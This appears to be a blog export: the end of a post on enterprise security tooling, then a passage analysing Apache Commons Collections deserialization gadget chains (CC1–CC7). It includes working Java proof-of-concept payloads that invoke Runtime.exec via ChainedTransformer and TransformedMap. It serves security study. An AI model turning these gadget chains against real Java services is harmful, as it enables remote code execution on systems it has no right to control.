<p>DevSecOps&#x7684;&#x5B89;&#x5168;&#x5DE5;&#x5177;&#x91D1;&#x5B57;&#x5854;: <a href="https://www.secrss.com/articles/28514" target="_blank" rel="noopener">https://www.secrss.com/articles/28514</a></p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/239421881a40b3353ce6a996930025b4.jpg" alt></p>
<h1 id="&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#x7684;&#x81EA;&#x52A8;&#x5316;"><a href="#&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#x7684;&#x81EA;&#x52A8;&#x5316;" class="headerlink" title="&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#x7684;&#x81EA;&#x52A8;&#x5316;"></a>&#x5B89;&#x5168;&#x6D4B;&#x8BD5;&#x7684;&#x81EA;&#x52A8;&#x5316;</h1><p>&#x5DE5;&#x5177;&#x94FE;&#x7684;&#x5EFA;&#x8BBE;&#x53EF;&#x80FD;&#x662F;&#x843D;&#x5730;&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x73AF;&#x8282;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/2a2e0637744cf533398ceff5e363652f.png" alt></p>
<h2 id="DAST"><a href="#DAST" class="headerlink" title="DAST"></a>DAST</h2><ul>
<li>&#x5B89;&#x5168;&#x626B;&#x63CF;&#x81EA;&#x52A8;&#x5316;&#x68C0;&#x6D4B;&#x5E73;&#x53F0;&#x5EFA;&#x8BBE;&#xFF08;Web&#x9ED1;&#x76D2;&#x4E0A;&#xFF09;&#xFF1A;<a href="https://sec.xiaomi.com/article/9" target="_blank" rel="noopener">https://sec.xiaomi.com/article/9</a></li>
<li>&#x5B89;&#x5168;&#x626B;&#x63CF;&#x81EA;&#x52A8;&#x5316;&#x68C0;&#x6D4B;&#x5E73;&#x53F0;&#x5EFA;&#x8BBE;&#xFF08;Web&#x9ED1;&#x76D2;&#x4E2D;&#xFF09;&#xFF1A;<a href="https://sec.xiaomi.com/article/10" target="_blank" rel="noopener">https://sec.xiaomi.com/article/10</a></li>
<li>&#x5B89;&#x5168;&#x626B;&#x63CF;&#x81EA;&#x52A8;&#x5316;&#x68C0;&#x6D4B;&#x5E73;&#x53F0;&#x5EFA;&#x8BBE;&#xFF08;Web&#x9ED1;&#x76D2;&#x4E0B;&#xFF09;&#xFF1A;<a href="https://sec.xiaomi.com/article/11" target="_blank" rel="noopener">https://sec.xiaomi.com/article/11</a></li>
<li>&#x7231;&#x5947;&#x827A;&#x5206;&#x5E03;&#x5F0F;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x7CFB;&#x7EDF;&#xFF1A;<a href="https://www.secrss.com/articles/12049" target="_blank" rel="noopener">https://www.secrss.com/articles/12049</a></li>
</ul>
<h2 id="SAST"><a href="#SAST" class="headerlink" title="SAST"></a>SAST</h2><p>SAST &#x4E4B;&#x524D;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</p>
<p>&#x8FD9;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5199;&#x7684;&#x975E;&#x5E38;&#x597D;&#xFF1A;<a href="https://www.secrss.com/articles/13724" target="_blank" rel="noopener">https://www.secrss.com/articles/13724</a></p>
<p>&#x540C;&#x65F6;&#x91CC;&#x9762;&#x9644;&#x52A0;&#x4E86;&#x5546;&#x4E1A;&#x5DE5;&#x5177;&#x7684;&#x4E00;&#x4E2A;&#x8BC4;&#x6D4B;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/240fe619c1d88f916b29f8baee21c7ac.jpg" alt></p>
<h1 id="&#x601D;&#x8003;&#x548C;&#x5C0F;&#x7ED3;"><a href="#&#x601D;&#x8003;&#x548C;&#x5C0F;&#x7ED3;" class="headerlink" title="&#x601D;&#x8003;&#x548C;&#x5C0F;&#x7ED3;"></a>&#x601D;&#x8003;&#x548C;&#x5C0F;&#x7ED3;</h1><p>&#x7ED3;&#x5408;&#x73B0;&#x72B6;&#x8003;&#x8651;&#xFF0C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x5728;&#x6821;&#x751F;&#xFF0C;&#x7EFC;&#x5408;&#x591A;&#x4E2A;&#x56E0;&#x7D20;&#xFF0C;&#x5728;&#x4E0D;&#x63A5;&#x89E6;&#x4F01;&#x4E1A;&#x4E2D;&#x4F53;&#x7CFB;&#x5316;&#x7684;&#x7532;&#x65B9;&#x5EFA;&#x8BBE;&#x6D41;&#x7A0B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x53EF;&#x4EE5;&#x7740;&#x624B;&#x7684;&#x65B9;&#x9762;&#x5982;&#x4E0B;&#xFF08;&#x5176;&#x4E2D;&#x53C2;&#x6742;&#x90E8;&#x5206;&#x4E59;&#x65B9;&#x89C6;&#x89D2;&#xFF09;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE.png" alt></p>
<p>&#x5F53;&#x7136;&#x5B83;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x4ECE; DevSecOps &#x6D41;&#x7A0B;&#x4E2D;&#x62BD;&#x51FA;&#x6765;&#x7684;&#x51E0;&#x4E2A;&#x677F;&#x5757;&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x4EE3;&#x8868;&#x6574;&#x4E2A;&#x5B89;&#x5168;&#x6D41;&#x7A0B;&#x5EFA;&#x8BBE;&#xFF0C;&#x9488;&#x5BF9;&#x627E;&#x5DE5;&#x4F5C;&#x800C;&#x8A00;&#xFF0C;&#x4E0A;&#x9762;&#x7684;&#x5185;&#x5BB9;&#x5E94;&#x8BE5;&#x662F;&#x5BF9;&#x7532;&#x4E59;&#x65B9;&#x5B89;&#x5168;&#x90FD;&#x6709;&#x5E2E;&#x52A9;&#x7684;&#x3002; </p>
</body></html>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons Collections 反序列化利用链分析</title>
    <url>/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x4E3A; Apache Commons Collections &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x5206;&#x6790;</p>
<a id="more"></a>

<p>[TOC]</p>
<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>&#x5728; CommonsCollections &#x751F;&#x6001;&#x4E2D;&#xFF0C;3 &#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x662F; 3.2.2&#x3002;&#x518D;&#x6B21;&#x57FA;&#x7840;&#x4E0A;&#x5F88;&#x591A;&#x5229;&#x7528;&#x94FE;&#x90FD;&#x5931;&#x6548;&#x4E86;&#x3002;&#x4E0B;&#x56FE; JDK &#x7248;&#x672C;&#x53EA;&#x662F;&#x5927;&#x7248;&#x672C;&#x666E;&#x904D;&#x9002;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x4E0D;&#x4EE3;&#x8868;&#x7EC6;&#x81F4;&#x7684;&#x5229;&#x7528;&#x7248;&#x672C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20201229000221187.png" alt></p>
<p>ysoserial info</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">CommonsCollections1 @frohoff                               commons-collections:3.1</span><br><span class="line">CommonsCollections2 @frohoff                               commons-collections4:4.0</span><br><span class="line">CommonsCollections3 @frohoff                               commons-collections:3.1</span><br><span class="line">CommonsCollections4 @frohoff                               commons-collections4:4.0</span><br><span class="line">CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1</span><br><span class="line">CommonsCollections6 @matthias_kaiser                       commons-collections:3.1</span><br><span class="line">CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1</span><br></pre></td></tr></tbody></table></figure><p></p>
<ul>
<li>CommonsCollections1<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>AnnotationInvocationHandler</code></li>
<li>&#x89C1;&#x524D;&#x6587;</li>
</ul>
</li>
<li>CommonsCollections2<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>PriorityQueue</code></li>
<li><code>PriorityQueue.readObject()</code>&#x6267;&#x884C;&#x6392;&#x5E8F;&#x65F6;&#xFF0C;<code>TransformingComparator.compare()</code>&#x4F1A;&#x8C03;&#x7528;<code>InvokerTransformer.transform()</code>&#x8F6C;&#x6362;&#x5143;&#x7D20;&#xFF0C;&#x8FDB;&#x800C;&#x83B7;&#x53D6;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;<code>TemplatesImpl</code>&#x7684;<code>newTransformer()</code>&#x5E76;&#x8C03;&#x7528;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections3<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>AnnotationInvocationHandler</code></li>
<li>&#x9664;<code>Transformer</code>&#x6570;&#x7EC4;&#x5143;&#x7D20;&#x7EC4;&#x6210;&#x4E0D;&#x540C;&#x5916;&#xFF0C;&#x4E0E;CommonsCollections1&#x57FA;&#x672C;&#x4E00;&#x81F4;</li>
</ul>
</li>
<li>CommonsCollections4<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>PriorityQueue</code></li>
<li><code>PriorityQueue.readObject()</code>&#x6267;&#x884C;&#x6392;&#x5E8F;&#x65F6;&#xFF0C;<code>TransformingComparator.compare()</code>&#x4F1A;&#x8C03;&#x7528;<code>ChainedTransformer.transform()</code>&#x8F6C;&#x6362;&#x5143;&#x7D20;&#xFF0C;&#x8FDB;&#x800C;&#x904D;&#x5386;&#x6267;&#x884C;<code>Transformer</code>&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x5143;&#x7D20;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections5<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>BadAttributeValueExpException</code></li>
<li><code>BadAttributeValueExpException.readObject()</code>&#x5F53;<code>System.getSecurityManager()</code>&#x4E3A;<code>null</code>&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>TiedMapEntry.toString()</code>&#xFF0C;&#x5B83;&#x5728;<code>getValue()</code>&#x65F6;&#x4F1A;&#x901A;&#x8FC7;<code>LazyMap.get()</code>&#x53D6;&#x503C;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections6<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>HashSet</code></li>
<li><code>HashSet.readObject()</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5404;&#x5143;&#x7D20;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>HashMap.put()</code>&#x5C06;&#x7ED3;&#x679C;&#x653E;&#x8FDB;&#x53BB;&#xFF0C;&#x800C;&#x5B83;&#x901A;&#x8FC7;<code>TiedMapEntry.hashCode()</code>&#x8BA1;&#x7B97;hash&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>getValue()</code>&#x89E6;&#x53D1;<code>LazyMap.get()</code>&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections7<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>Hashtable</code></li>
<li><code>Hashtable#readObject</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5404;&#x5143;&#x7D20;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>reconstitutionPut</code>&#xFF0C;&#x540E;&#x9762;&#x5229;&#x7528;&#x94FE;&#x4E2D;&#x5728;&#x6BD4;&#x8F83;hash&#x503C;&#x7684;&#x65F6;&#x5019;&#x7528;&#x5230;&#x4E86;hashcode&#x76F8;&#x7B49;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32; yy &#x548C; zZ&#x3002;&#x6700;&#x540E;&#x540E;<code>AbstractMap#equals</code> &#x89E6;&#x53D1;<code>LazyMap.get()</code>&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
</ul>
<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x7406;&#x6E05;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;</p>
<ul>
<li>Transformer</li>
<li>ConstantTransformer</li>
<li>InvokerTransformer</li>
<li>ChainedTransformer</li>
<li>AnnotationInvocationHandler</li>
</ul>
<p>&#x6839;&#x636E;&#x5176;&#x6E90;&#x7801;&#xFF0C;&#x7ED3;&#x5408; java.lang.Runtime &#x53EF;&#x4EE5;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F; Runtime &#x4E3A;&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#xFF0C;&#x800C;&#x4E14;&#x6CA1;&#x6709;&#x7EE7;&#x627F; Serializable&#xFF0C; &#x56E0;&#x6B64;&#x8C03;&#x7528; getRuntime &#x4E4B;&#x540E;&#x83B7;&#x5F97;&#x7684;&#x7C7B;&#x5B9E;&#x4F8B;&#x4E0D;&#x80FD;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x524D;&#x63D0;&#x662F;&#x8C03;&#x7528;&#x6784;&#x9020;&#x7684; ChainedTransformer &#x7684; transform&#x3002;&#x7531;&#x6B64;&#x6784;&#x9020;&#x51FA;&#x6765;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<p><strong>Level-0 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        ChainedTransformer demo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;open -a Calculator&quot;</span>})});</span><br><span class="line">        demo.transform(String.class);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5F04;&#x6E05;&#x695A;&#x4E0A;&#x8FF0; payload &#x53EA;&#x9700;&#x8981;&#x89E3;&#x51B3;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;</p>
<ol>
<li>&#x5404; Transformer &#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x4EE5;&#x53CA;&#x4ED6;&#x4EEC;&#x4E4B;&#x95F4;&#x7684;&#x8054;&#x7CFB;</li>
<li>&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x539F;&#x672C;&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x7684; ConstantTransformer &#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0D;&#x662F;&#x591A;&#x6B64;&#x4E00;&#x4E3E;&#x4E48;&#xFF1F;</li>
<li>&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x53CD;&#x5C04;&#x8C03;&#x7528; getRuntime&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x4F20;&#x5165; Runtime.getRuntime &#xFF1F;</li>
</ol>
<p>CommonsCollections1 &#x7F51;&#x4E0A;&#x7684; POC &#x5176;&#x5B9E;&#x4E5F;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x5229;&#x7528;&#x94FE;</p>
<ul>
<li>TransformedMap&#xFF08;&#x7F51;&#x4E0A;&#x6D41;&#x4F20;&#x7684;&#x5229;&#x7528;&#x94FE;&#xFF09;</li>
<li>LazyMap &#xFF08;ysoserial &#x4E2D;&#x5229;&#x7528;&#x94FE;&#xFF09;</li>
</ul>
<p>&#x8FD9;&#x91CC;&#x5F15;&#x7528; @phithon &#x5E08;&#x5085; Java&#x5B89;&#x5168;&#x6F2B;&#x8C08; &#x7684;&#x4E00;&#x6BB5;&#x8BDD;</p>
<blockquote>
<p>&#x65E2;&#x7136;ysoserial&#x4E2D;&#x6CA1;&#x6709;&#x7528;&#x5230;TransformedMap&#xFF0C;&#x90A3;&#x4E48;TransformedMap&#x7A76;&#x7ADF;&#x662F;&#x8C01;&#x6700;&#x5148;&#x63D0;&#x51FA;&#x6765;&#x7684;&#x5462;&#xFF1F; &#x636E;&#x6211;&#x7684;&#x8003;&#x8BC1;&#xFF0C;&#x6700;&#x65E9;&#x8BB2;&#x5230;TransformedMap&#x5E94;&#x8BE5;&#x662F;Code White&#x7684;&#x8FD9;&#x7BC7;Slide&#xFF1A;Exploiting Deserialization Vulnerabilities in Java&#xFF0C;&#x540E;&#x6765;&#x957F;&#x4EAD;&#x79D1;&#x6280;&#x7684;&#x535A;&#x5BA2;&#x6587;&#x7AE0;&#x300A;Lib&#x4E4B;&#x8FC7;&#xFF1F;Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E; &#x901A;&#x7528;&#x5229;&#x7528;&#x5206;&#x6790;&#x300B;&#x5BF9;&#x6B64;&#x8FDB;&#x884C;&#x4E86;&#x8FDB;&#x4E00;&#x6B65;&#x5206;&#x6790;&#xFF0C;&#x540E;&#x6765;&#x624D;&#x5728;&#x56FD;&#x5185;&#x4F17;&#x591A;&#x6587;&#x7AE0;&#x4E2D;&#x88AB;&#x8BB2;&#x5230;&#x3002;</p>
</blockquote>
<p>&#x5176;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x5DEE;&#x522B;&#x5728;&#x4E8E;&#x6267;&#x884C; <code>transform</code> &#x7684;&#x4E0D;&#x540C;</p>
<p>&#x76F8;&#x540C;&#x7684;&#x662F;&#x5747;&#x65E0;&#x6CD5;&#x89E3;&#x51B3; CommonCollections1 &#x8FD9;&#x6761;&#x5229;&#x7528;&#x94FE;&#x5728;&#x9AD8;&#x7248;&#x672C;Java&#xFF08;8u71&#x4EE5;&#x540E;&#xFF09;&#x4E2D;&#x7684;&#x4F7F;&#x7528;&#x95EE;&#x9898;</p>
<h2 id="TransformedMap-Gadget-chain"><a href="#TransformedMap-Gadget-chain" class="headerlink" title="TransformedMap Gadget chain"></a>TransformedMap Gadget chain</h2><p>&#x5229;&#x7528;&#x94FE;&#x662F; TransformedMap &#xFF0C;&#x5148;&#x5BF9;&#x6211;&#x4EEC;&#x4E4B;&#x524D; level-0 &#x7684; payload &#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x5347;&#x7EA7;&#xFF0C;&#x540C;&#x6837;&#x662F;&#x6700;&#x57FA;&#x7840;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x76F4;&#x63A5;&#x4F7F;&#x7528; ChainedTransformer &#x7684; transform &#x65B9;&#x6CD5;&#x89E6;&#x53D1;&#xFF0C;&#x800C;&#x6539;&#x7528; TransformedMap &#x7684;&#x65B9;&#x6CD5;</p>
<p>&#x9996;&#x5148; TransformedMap &#x4E2D;&#x6709;&#x8FD9;&#x4E09;&#x4E2A;&#x7C7B;&#x8C03;&#x7528;&#x4E86; transform &#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x90FD;&#x662F; protected &#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x627E;&#x5230;&#x95F4;&#x63A5;&#x8C03;&#x7528;&#x5B83;&#x4EEC;&#x7684;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210004211853.png" alt></p>
<p>&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#x95F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;  transformKey &#x548C; transformValue &#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x4E14;&#x90FD;&#x662F; public &#x65B9;&#x6CD5;&#xFF08;checkSetValue &#x65B9;&#x6CD5;&#x540E;&#x6587;&#x518D;&#x63D0;&#xFF09;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210004917701.png" alt></p>
<p><strong>Level-1 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;open -a Calculator&quot;</span>)})});</span><br><span class="line">        TransformedMap outerMap = (TransformedMap) TransformedMap.decorate(<span class="hljs-keyword">new</span> HashMap&lt;String, String&gt;(), <span class="hljs-keyword">null</span>, chainDemo);</span><br><span class="line">        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#x5982;&#x4E0B;</p>
<p>&#x9996;&#x5148;&#x8C03;&#x7528; <code>decorate</code> &#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x5BF9;  <code>valueTransformer</code> &#x8FDB;&#x884C;&#x4E86;&#x9644;&#x503C;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A; TransformedMap &#x5BF9;&#x8C61;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209184506179.png" alt></p>
<p>&#x540E;&#x7EED;&#x5728; <code>TransformedMap#transformValue</code> &#x8C03;&#x7528;&#x4E86; <code>transform</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209184258134.png" alt></p>
<p>debug &#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x662F;&#x8FD9;&#x4E48;&#x5199;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">outMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-keyword">null</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
